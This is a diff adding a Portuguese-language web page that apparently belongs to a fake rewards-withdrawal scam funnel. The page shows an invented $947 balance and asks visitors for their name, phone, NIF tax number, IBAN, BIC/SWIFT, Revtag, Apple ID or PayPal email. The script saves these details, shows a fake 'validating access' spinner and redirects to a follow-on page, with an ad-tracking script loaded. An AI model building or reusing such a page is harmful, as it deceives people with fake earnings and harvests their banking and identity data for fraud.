@@ -1,0 +1,416 @@
+<!doctype html>
+<html lang="pt-PT">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Resgatar Recompensas</title>
+
+  <link rel="stylesheet" href="css/main.css" />
+  <link rel="stylesheet" href="css/pages.css" />
+  <link rel="stylesheet" href="css/modal.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <script
+    src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
+    data-token="7d40c830-4300-4bad-a114-510741bc7700"
+  ></script>
+</head>
+
+<body>
+  <div class="app-container">
+    <div class="withdraw-page">
+      <div class="page-header">
+        <button class="back-btn" id="back-btn">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M19 12H5M12 19l-7-7 7-7" />
+          </svg>
+        </button>
+        <h1>Resgatar Recompensas</h1>
+        <button class="help-btn">
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10" />
+            <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
+            <path d="M12 17h.01" />
+          </svg>
+        </button>
+      </div>
+
+      <!-- Balance Card -->
+      <div class="balance-card">
+        <div class="balance-title">O Seu Saldo</div>
+        <div class="balance-amount-wrapper">
+          <div class="balance-amount">$947.00</div>
+          <img class="balance-image" src="images/p-saldo-maior.png" alt="ícone">
+        </div>
+      </div>
+
+      <div class="last-rewards">
+        Recompensas recentes: $54.87
+      </div>
+
+      <!-- Main Section -->
+      <div class="withdraw-content">
+        <h2 class="withdraw-title">Levantar Dinheiro</h2>
+
+        <!-- Payment Methods -->
+        <div class="payment-methods-row">
+          <div class="payment-method-item">
+            <img src="images/mbway-logo.png" alt="MB WAY" class="payment-method-logo">
+            <span class="payment-method-name">MB WAY</span>
+          </div>
+          <span class="payment-method-separator">/</span>
+          <div class="payment-method-item">
+            <img src="images/multibanco-logo.png" alt="Multibanco" class="payment-method-logo">
+            <span class="payment-method-name">Multibanco</span>
+          </div>
+          <span class="payment-method-separator">/</span>
+          <div class="payment-method-item">
+            <img src="https://www.vectorlogo.zone/logos/revolut/revolut-icon.svg" alt="Revolut" class="payment-method-logo">
+            <span class="payment-method-name">Revolut</span>
+          </div>
+          <span class="payment-method-separator">/</span>
+          <div class="payment-method-item">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b0/Apple_Pay_logo.svg" alt="Apple Pay" class="payment-method-logo">
+            <span class="payment-method-name">Apple Pay</span>
+          </div>
+          <span class="payment-method-separator">/</span>
+          <div class="payment-method-item">
+            <img src="images/iban-logo.png" alt="SEPA" class="payment-method-logo">
+            <span class="payment-method-name">SEPA</span>
+          </div>
+          <span class="payment-method-separator">/</span>
+          <div class="payment-method-item">
+            <img src="images/paypal-logo.svg" alt="PayPal" class="payment-method-logo">
+            <span class="payment-method-name">PayPal</span>
+          </div>
+        </div>
+
+        <!-- Amount Buttons -->
+        <div class="amount-options">
+          <button class="amount-btn" data-amount="1.50">$1.50</button>
+          <button class="amount-btn" data-amount="5">$5</button>
+          <button class="amount-btn" data-amount="10">$10</button>
+          <button class="amount-btn" data-amount="947.00">$947.00</button>
+        </div>
+
+        <!-- Selected Method Display -->
+        <div id="selected-method-display" class="selected-method-display" style="display: none;">
+          <div class="method-display-item">
+            <span class="method-logo" id="display-method-logo"></span>
+            <div>
+              <div class="method-name" id="display-method-name"></div>
+              <div class="method-subtitle">Pagamento Instantâneo</div>
+            </div>
+            <button class="change-method-btn" onclick="openMethodModal()">Alterar</button>
+          </div>
+        </div>
+
+        <!-- Method Form -->
+        <div id="method-form-container" style="display: none;"></div>
+
+        <!-- Add Method Button -->
+        <button class="add-method-btn" id="add-method-btn">Adicionar Método de Levantamento</button>
+
+        <!-- Info Texts -->
+        <div class="withdraw-info-text">
+          <p>Para levantar dinheiro, precisa de um saldo mínimo de $0.40.</p>
+          <p>Os limites de levantamento para transações individuais e mensais podem variar consoante o país ou região.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Withdrawal Methods Modal -->
+  <div id="method-modal" class="method-modal" style="display: none">
+    <div class="method-modal-content">
+      <div class="method-modal-header">
+        <h2>Adicionar Método de Levantamento</h2>
+        <button class="method-modal-close" onclick="closeMethodModal()">
+          &times;
+        </button>
+      </div>
+      <div class="method-options">
+        <div class="method-option" onclick="selectMethod('mbway')">
+          <div class="method-option-left">
+            <div class="method-logo">
+              <img src="images/mbway-logo.png" alt="MB WAY"
+                style="width: 50px; height: 35px; object-fit: contain" />
+            </div>
+            <div class="method-option-text">
+              <div class="method-option-name">MB WAY</div>
+              <div class="method-option-subtitle">Pagamento Instantâneo</div>
+            </div>
+          </div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color: #999">
+            <path d="M5 12h14M12 5l7 7-7 7"></path>
+          </svg>
+        </div>
+        <div class="method-option" onclick="selectMethod('multibanco')">
+          <div class="method-option-left">
+            <div class="method-logo">
+              <img src="images/multibanco-logo.png" alt="Multibanco" style="width: 50px; height: 35px; object-fit: contain" />
+            </div>
+            <div class="method-option-text">
+              <div class="method-option-name">Multibanco</div>
+              <div class="method-option-subtitle">Transferência Bancária</div>
+            </div>
+          </div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color: #999">
+            <path d="M5 12h14M12 5l7 7-7 7"></path>
+          </svg>
+        </div>
+        <div class="method-option" onclick="selectMethod('revolut')">
+          <div class="method-option-left">
+            <div class="method-logo">
+              <img src="https://www.vectorlogo.zone/logos/revolut/revolut-icon.svg" alt="Revolut" style="width: 50px; height: 35px; object-fit: contain" />
+            </div>
+            <div class="method-option-text">
+              <div class="method-option-name">Revolut</div>
+              <div class="method-option-subtitle">Fintech / Instantâneo</div>
+            </div>
+          </div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color: #999">
+            <path d="M5 12h14M12 5l7 7-7 7"></path>
+          </svg>
+        </div>
+        <div class="method-option" onclick="selectMethod('applepay')">
+          <div class="method-option-left">
+            <div class="method-logo">
+              <img src="https://upload.wikimedia.org/wikipedia/commons/b/b0/Apple_Pay_logo.svg" alt="Apple Pay" style="width: 50px; height: 35px; object-fit: contain" />
+            </div>
+            <div class="method-option-text">
+              <div class="method-option-name">Apple Pay</div>
+              <div class="method-option-subtitle">Carteira Digital</div>
+            </div>
+          </div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color: #999">
+            <path d="M5 12h14M12 5l7 7-7 7"></path>
+          </svg>
+        </div>
+        <div class="method-option" onclick="selectMethod('sepa')">
+          <div class="method-option-left">
+            <div class="method-logo">
+              <img src="images/iban-logo.png" alt="SEPA" style="width: 50px; height: 35px; object-fit: contain" />
+            </div>
+            <div class="method-option-text">
+              <div class="method-option-name">Transferência SEPA</div>
+              <div class="method-option-subtitle">Conta Bancária (IBAN)</div>
+            </div>
+          </div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color: #999">
+            <path d="M5 12h14M12 5l7 7-7 7"></path>
+          </svg>
+        </div>
+        <div class="method-option" onclick="selectMethod('paypal')">
+          <div class="method-option-left">
+            <div class="method-logo">
+              <img src="images/paypal-logo.svg" alt="PayPal" style="width: 50px; height: 35px; object-fit: contain" />
+            </div>
+            <div class="method-option-text">
+              <div class="method-option-name">PayPal</div>
+              <div class="method-option-subtitle">Pagamento Online</div>
+            </div>
+          </div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color: #999">
+            <path d="M5 12h14M12 5l7 7-7 7"></path>
+          </svg>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Loading overlay -->
+  <div id="loading-overlay"
+    style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:#fff; z-index:9999; justify-content:center; align-items:center;">
+    <div style="text-align:center;">
+      <div class="loading-text" style="font-size:18px; margin-bottom:20px;">A validar acesso...</div>
+      <div class="loading-spinner"
+        style="width:40px; height:40px; border:4px solid #eee; border-top:4px solid #000; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto;">
+      </div>
+    </div>
+  </div>
+  <style>
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+
+  <script src="js/notifications.js"></script>
+  <script>
+    let selectedPaymentMethod = null;
+
+    // Hide loading overlay on page show (bfcache restore)
+    window.addEventListener('pageshow', function () {
+      document.getElementById('loading-overlay').style.display = 'none';
+    });
+
+    // Back button
+    document.getElementById('back-btn').addEventListener('click', function () {
+      window.location.href = 'of.html' + window.location.search;
+    });
+
+    // Amount buttons
+    document.querySelectorAll('.amount-btn').forEach(function (btn) {
+      btn.addEventListener('click', function () {
+        document.querySelectorAll('.amount-btn').forEach(function (b) {
+          b.classList.remove('selected');
+        });
+        btn.classList.add('selected');
+      });
+    });
+
+    // Add method button
+    document.getElementById('add-method-btn').addEventListener('click', function () {
+      openMethodModal();
+    });
+
+    // Close modal on backdrop click
+    document.getElementById('method-modal').addEventListener('click', function (e) {
+      if (e.target === this) closeMethodModal();
+    });
+
+    function openMethodModal() {
+      document.getElementById('method-modal').style.display = 'flex';
+    }
+
+    function closeMethodModal() {
+      document.getElementById('method-modal').style.display = 'none';
+    }
+
+    function selectMethod(method) {
+      selectedPaymentMethod = method;
+      closeMethodModal();
+      renderMethodForm(method);
+      updateMethodDisplay(method);
+    }
+
+    function renderMethodForm(method) {
+      var container = document.getElementById('method-form-container');
+      var addBtn = document.getElementById('add-method-btn');
+      if (!container) return;
+
+      var forms = {
+        mbway: '<div class="method-form"><h3>Ligar Método de Pagamento</h3><div class="form-group"><label>Nome Completo</label><input type="text" class="form-input" placeholder="Como aparece no banco" id="mbway-name"></div><div class="form-group"><label>Telemóvel MB WAY</label><input type="tel" class="form-input" placeholder="9xxxxxxxx" id="mbway-phone" maxlength="9"></div><div class="form-group"><label>NIF (Opcional)</label><input type="tel" class="form-input" placeholder="9 dígitos" id="mbway-nif" maxlength="9"></div><button class="form-submit-btn" onclick="submitMethodForm()">Submeter</button></div>',
+        multibanco: '<div class="method-form"><h3>Ligar Método de Pagamento</h3><div class="form-group"><label>Nome do Titular da Conta</label><input type="text" class="form-input" placeholder="Nome completo" id="multibanco-name"></div><div class="form-group"><label>IBAN</label><input type="text" class="form-input" placeholder="PT50 xxxx xxxx xxxx xxxx xxxx x" id="multibanco-iban" maxlength="25"></div><div class="form-group"><label>NIF do Titular</label><input type="tel" class="form-input" placeholder="9 dígitos" id="multibanco-nif" maxlength="9"></div><button class="form-submit-btn" onclick="submitMethodForm()">Submeter</button></div>',
+        revolut: '<div class="method-form"><h3>Ligar Método de Pagamento</h3><div class="form-group"><label>Nome Completo</label><input type="text" class="form-input" placeholder="Nome no Revolut" id="revolut-name"></div><div class="form-group"><label>Revtag</label><input type="text" class="form-input" placeholder="@oseunome" id="revolut-tag" maxlength="30"></div><button class="form-submit-btn" onclick="submitMethodForm()">Submeter</button></div>',
+        applepay: '<div class="method-form"><h3>Ligar Método de Pagamento</h3><div class="form-group"><label>Nome Completo</label><input type="text" class="form-input" placeholder="Nome do ID Apple" id="applepay-name"></div><div class="form-group"><label>E-mail do ID Apple</label><input type="email" class="form-input" placeholder="exemplo@icloud.com" id="applepay-email"></div><button class="form-submit-btn" onclick="submitMethodForm()">Submeter</button></div>',
+        sepa: '<div class="method-form"><h3>Ligar Método de Pagamento</h3><div class="form-group"><label>Nome do Titular</label><input type="text" class="form-input" placeholder="Nome completo" id="sepa-name"></div><div class="form-group"><label>IBAN</label><input type="text" class="form-input" placeholder="PT50 xxxx xxxx xxxx xxxx xxxx x" id="sepa-iban" maxlength="25"></div><div class="form-group"><label>Código BIC/SWIFT</label><input type="text" class="form-input" placeholder="XXXXPTXX" id="sepa-swift" maxlength="11"></div><button class="form-submit-btn" onclick="submitMethodForm()">Submeter</button></div>',
+        paypal: '<div class="method-form"><h3>Ligar Método de Pagamento</h3><div class="form-group"><label>Nome Completo</label><input type="text" class="form-input" placeholder="Nome no PayPal" id="paypal-name"></div><div class="form-group"><label>E-mail do PayPal</label><input type="email" class="form-input" placeholder="seu@email.com" id="paypal-email"></div><button class="form-submit-btn" onclick="submitMethodForm()">Submeter</button></div>'
+      };
+
+      container.innerHTML = forms[method] || '';
+      container.style.display = 'block';
+      if (addBtn) addBtn.style.display = 'none';
+
+      // Numeric-only for phone and NIF fields
+      if (method === 'mbway') {
+        ['mbway-phone', 'mbway-nif'].forEach(function (id) {
+          var input = document.getElementById(id);
+          if (input) input.addEventListener('input', function (e) { e.target.value = e.target.value.replace(/\D/g, ''); });
+        });
+      }
+      if (method === 'multibanco') {
+        var input = document.getElementById('multibanco-nif');
+        if (input) input.addEventListener('input', function (e) { e.target.value = e.target.value.replace(/\D/g, ''); });
+      }
+    }
+
+    function updateMethodDisplay(method) {
+      var display = document.getElementById('selected-method-display');
+      var logo = document.getElementById('display-method-logo');
+      var name = document.getElementById('display-method-name');
+      if (!display || !logo || !name) return;
+
+      var info = {
+        mbway: { src: 'images/mbway-logo.png', alt: 'MB WAY', label: 'MB WAY' },
+        multibanco: { src: 'images/multibanco-logo.png', alt: 'Multibanco', label: 'Multibanco' },
+        revolut: { src: 'https://www.vectorlogo.zone/logos/revolut/revolut-icon.svg', alt: 'Revolut', label: 'Revolut' },
+        applepay: { src: 'https://upload.wikimedia.org/wikipedia/commons/b/b0/Apple_Pay_logo.svg', alt: 'Apple Pay', label: 'Apple Pay' },
+        sepa: { src: 'images/iban-logo.png', alt: 'SEPA', label: 'Transferência SEPA' },
+        paypal: { src: 'images/paypal-logo.svg', alt: 'PayPal', label: 'PayPal' }
+      }[method];
+
+      if (info) {
+        logo.innerHTML = '<img src="' + info.src + '" alt="' + info.alt + '" style="width:50px;height:35px;object-fit:contain;">';
+        name.textContent = info.label;
+      }
+      display.style.display = 'block';
+    }
+
+    function submitMethodForm() {
+      var formData = {};
+
+      if (selectedPaymentMethod === 'mbway') {
+        var name = (document.getElementById('mbway-name') || {}).value || '';
+        var phone = (document.getElementById('mbway-phone') || {}).value || '';
+        var nif = (document.getElementById('mbway-nif') || {}).value || '';
+        if (!name.trim() || !phone.trim()) { alert('Por favor, preencha o Nome e Telemóvel'); return; }
+        if (!/^9\d{8}$/.test(phone)) { alert('Por favor, insira um número de telemóvel válido (9 dígitos começando por 9)'); return; }
+        if (nif && !/^\d{9}$/.test(nif)) { alert('O NIF deve ter 9 dígitos'); return; }
+        formData = { name: name.trim(), account: phone.trim(), nif: nif.trim(), method: 'mbway' };
+      } else if (selectedPaymentMethod === 'multibanco') {
+        var name = (document.getElementById('multibanco-name') || {}).value || '';
+        var iban = (document.getElementById('multibanco-iban') || {}).value || '';
+        var nif = (document.getElementById('multibanco-nif') || {}).value || '';
+        if (!name.trim() || !iban.trim() || !nif.trim()) { alert('Por favor, preencha todos os campos'); return; }
+        if (!/^\d{9}$/.test(nif)) { alert('O NIF deve ter 9 dígitos'); return; }
+        formData = { name: name.trim(), account: iban.trim(), nif: nif.trim(), method: 'multibanco' };
+      } else if (selectedPaymentMethod === 'revolut') {
+        var name = (document.getElementById('revolut-name') || {}).value || '';
+        var tag = (document.getElementById('revolut-tag') || {}).value || '';
+        if (!name.trim() || !tag.trim()) { alert('Por favor, preencha todos os campos'); return; }
+        formData = { name: name.trim(), account: tag.trim(), method: 'revolut' };
+      } else if (selectedPaymentMethod === 'applepay') {
+        var name = (document.getElementById('applepay-name') || {}).value || '';
+        var email = (document.getElementById('applepay-email') || {}).value || '';
+        if (!name.trim() || !email.trim()) { alert('Por favor, preencha todos os campos'); return; }
+        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { alert('Por favor, insira um endereço de e-mail válido'); return; }
+        formData = { name: name.trim(), account: email.trim(), method: 'applepay' };
+      } else if (selectedPaymentMethod === 'sepa') {
+        var name = (document.getElementById('sepa-name') || {}).value || '';
+        var iban = (document.getElementById('sepa-iban') || {}).value || '';
+        var swift = (document.getElementById('sepa-swift') || {}).value || '';
+        if (!name.trim() || !iban.trim()) { alert('Por favor, preencha o Nome e IBAN'); return; }
+        formData = { name: name.trim(), account: iban.trim(), swift: swift.trim(), method: 'sepa' };
+      } else if (selectedPaymentMethod === 'paypal') {
+        var name = (document.getElementById('paypal-name') || {}).value || '';
+        var email = (document.getElementById('paypal-email') || {}).value || '';
+        if (!name.trim() || !email.trim()) { alert('Por favor, preencha todos os campos'); return; }
+        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { alert('Por favor, insira um endereço de e-mail válido'); return; }
+        formData = { name: name.trim(), account: email.trim(), method: 'paypal' };
+      }
+
+      // Save form data to pass to of3.html via sessionStorage
+      sessionStorage.setItem('withdrawalFormData', JSON.stringify(formData));
+
+      // Show loading overlay
+      var overlay = document.getElementById('loading-overlay');
+      overlay.style.display = 'flex';
+
+      // Redirect to of3.html after loading
+      setTimeout(function () {
+        window.location.href = 'of3.html' + window.location.search;
+      }, 2500);
+    }
+
+    // Expose functions globally for onclick handlers
+    window.openMethodModal = openMethodModal;
+    window.closeMethodModal = closeMethodModal;
+    window.selectMethod = selectMethod;
+    window.submitMethodForm = submitMethodForm;
+  </script>
+
+
+</body>
+
+</html>
